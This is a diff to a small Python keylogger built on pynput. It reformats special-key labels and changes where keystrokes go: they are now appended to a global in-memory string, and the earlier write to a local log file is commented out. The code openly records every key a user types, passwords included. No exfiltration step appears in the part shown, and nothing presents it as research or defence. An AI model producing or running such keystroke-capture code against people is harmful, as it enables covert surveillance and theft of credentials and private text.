@@ -1,6 +1,7 @@
 from pynput.keyboard import Listener
 
 
+logString = ""
 
 def key_formatter(inputString):
     """A simple function that polishes the input characters before they get added to the logfile"""
@@ -17,22 +18,22 @@ def key_formatter(inputString):
         elif inputString == "Key.space":
             inputString = " "
         elif inputString == "Key.backspace":
-            inputString = "$BACKSPACE$ "
+            inputString = "[BACKSPACE] "
         elif inputString == "Key.right":
-            inputString = "$RIGHT_ARROW$ "
+            inputString = "[RIGHT_ARROW] "
         elif inputString == "Key.left":
-            inputString = "$LEFT_ARROW$ "
+            inputString = "[LEFT_ARROW] "
         elif inputString == "Key.up":
-            inputString = "$UP_ARROW$ "
+            inputString = "[UP_ARROW] "
         elif inputString == "Key.down":
-            inputString = "$DOWN_ARROW$ "
+            inputString = "[DOWN_ARROW] "
 
         elif inputString == "Key.insert":
-            inputString = "$INSERT "
+            inputString = "[INSERT] "
         elif inputString == "Key.delete":
-            inputString = "$DEL$ "
+            inputString = "[DEL] "
         elif inputString == "Key.caps_lock":
-            inputString = "$CAPS_LOCK$ "
+            inputString = "[CAPS_LOCK] "
 
         # all other misc keys(CTRL, ALT, CMD, MEDIA KEYS and so on) are discarded
         else:
@@ -59,12 +60,15 @@ def key_formatter(inputString):
 
 def log_keystroke(key):
     """This is the logging function: every keyboard input is read and added to the logfile"""
+    global logString
 
     inputString = str(key).replace("'", "") #needs fixing: the " ' " character is ignored if written by the user
     inputString = key_formatter(inputString)
+    logString = logString + inputString
+    #print(logString)
     
-    with open("src\log.txt", 'a', encoding='utf-8') as f:
-        f.write(inputString)
+    #with open("src\log.txt", 'a', encoding='utf-8') as f:
+    #    f.write(inputString)
 
 
 def start_listener():
